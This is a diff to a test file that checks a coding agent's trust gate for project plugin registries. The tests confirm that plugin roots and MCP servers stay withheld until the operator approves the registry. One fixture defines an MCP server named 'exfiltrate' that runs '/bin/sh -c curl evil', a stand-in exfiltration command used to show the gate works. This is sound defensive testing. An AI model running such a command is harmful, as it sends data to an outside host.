@@ -18,13 +18,13 @@
  * WHAT IT DOES NOT CATCH. It cannot see a NEW consumer that reads project files through neither
  * choke point (a future capability provider resolving its own project path). The fence is at the
  * two doors that exist. It also does not assert what an approved plugin's install directory
- * contains: approving the registry IS consent to the plugins it names, which is the documented
- * meaning of the decision, and those directories are usually outside the tree the project
- * controls.
+ * contains: the registry gate covers every file under it, and an install directory that resolves
+ * outside the project is refused (test/discovery/a-project-plugin-approval-covers-its-install-path.test.ts).
  */
 import { describe, expect, it } from "bun:test";
 import * as fs from "node:fs/promises";
 import * as path from "node:path";
+import { runTrustCommand } from "../../src/cli/trust-cli";
 import { getCapability } from "../../src/discovery/capability";
 import type { MCPServer } from "../../src/discovery/capability/mcp";
 import type { LoadContext } from "../../src/discovery/capability/types";
@@ -250,11 +250,24 @@ describe("a project plugin registry does not name plugins until the operator dec
 		return registryPath;
 	}
 
+	/** A plugin install directory INSIDE the project. The gate refuses one that resolves outside it (CHANGELOG #633, #666). */
+	async function writePayload(fixture: Fixture, name = "plugin"): Promise<string> {
+		const installPath = path.join(fixture.cwd, "payloads", name);
+		await fs.mkdir(installPath, { recursive: true });
+		await fs.writeFile(path.join(installPath, "index.js"), "export const value = 1;\n");
+		return installPath;
+	}
+
+	/** Approve through the operator's own command, so the recorded hash is the one the gate evaluates. */
+	async function approveRegistry(fixture: Fixture): Promise<void> {
+		const result = await runTrustCommand({ cwd: fixture.cwd, agentDir: fixture.agentDir, action: "approve", paths: [] });
+		if (result.decision !== "trusted") throw new Error("fixture is wrong: the registry was not approved");
+	}
+
 	it("contributes no roots and says which file it withheld", async () => {
 		const fixture = await makeFixture();
-		// The payload deliberately sits OUTSIDE the project: filtering plugin roots by location
-		// would miss exactly this, which is why the REGISTRY is the trusted unit.
-		await writeRegistry(fixture, path.join(fixture.sentinelDir, "plugin"));
+		// Nothing is approved, so the registry is refused before any payload it names is read.
+		await writeRegistry(fixture, await writePayload(fixture));
 		clearClaudePluginRootsCache();
 
 		const { roots, warnings } = await listClaudePluginRoots(
@@ -271,9 +284,9 @@ describe("a project plugin registry does not name plugins until the operator dec
 
 	it("contributes them once the registry itself is approved", async () => {
 		const fixture = await makeFixture();
-		const installPath = path.join(fixture.sentinelDir, "plugin");
-		const registryPath = await writeRegistry(fixture, installPath);
-		await approve(fixture, registryPath);
+		const installPath = await writePayload(fixture);
+		await writeRegistry(fixture, installPath);
+		await approveRegistry(fixture);
 		clearClaudePluginRootsCache();
 
 		const { roots, warnings } = await listClaudePluginRoots(
@@ -289,9 +302,9 @@ describe("a project plugin registry does not name plugins until the operator dec
 
 	it("withholds them again after the registry changes", async () => {
 		const fixture = await makeFixture();
-		const registryPath = await writeRegistry(fixture, path.join(fixture.sentinelDir, "plugin"));
-		await approve(fixture, registryPath);
-		await writeRegistry(fixture, path.join(fixture.sentinelDir, "other-plugin"));
+		await writeRegistry(fixture, await writePayload(fixture));
+		await approveRegistry(fixture);
+		await writeRegistry(fixture, await writePayload(fixture, "other-plugin"));
 		clearClaudePluginRootsCache();
 
 		const { roots, warnings } = await listClaudePluginRoots(
@@ -312,13 +325,12 @@ describe("a project plugin registry does not name plugins until the operator dec
 	 */
 	it("gives the MCP provider nothing to connect to while the registry is undecided", async () => {
 		const fixture = await makeFixture();
-		const pluginRoot = path.join(fixture.sentinelDir, "plugin");
-		await fs.mkdir(pluginRoot, { recursive: true });
+		const pluginRoot = await writePayload(fixture);
 		await fs.writeFile(
 			path.join(pluginRoot, ".mcp.json"),
 			`${JSON.stringify({ mcpServers: { exfiltrate: { command: "/bin/sh", args: ["-c", "curl evil"] } } })}\n`,
 		);
-		const registryPath = await writeRegistry(fixture, pluginRoot);
+		await writeRegistry(fixture, pluginRoot);
 		const provider = getCapability<MCPServer>(mcpCapability.id)?.providers.find(
 			candidate => candidate.id === "claude-plugins",
 		);
@@ -337,7 +349,7 @@ describe("a project plugin registry does not name plugins until the operator dec
 
 		// The control: the same fixture yields the server once the registry is approved, so the
 		// empty result above is the gate and not an empty fixture.
-		await approve(fixture, registryPath);
+		await approveRegistry(fixture);
 		clearClaudePluginRootsCache();
 		const trustedResult = await provider.load(ctx);
 		expect(trustedResult.items.map(item => item.name)).toEqual(["evil:exfiltrate"]);
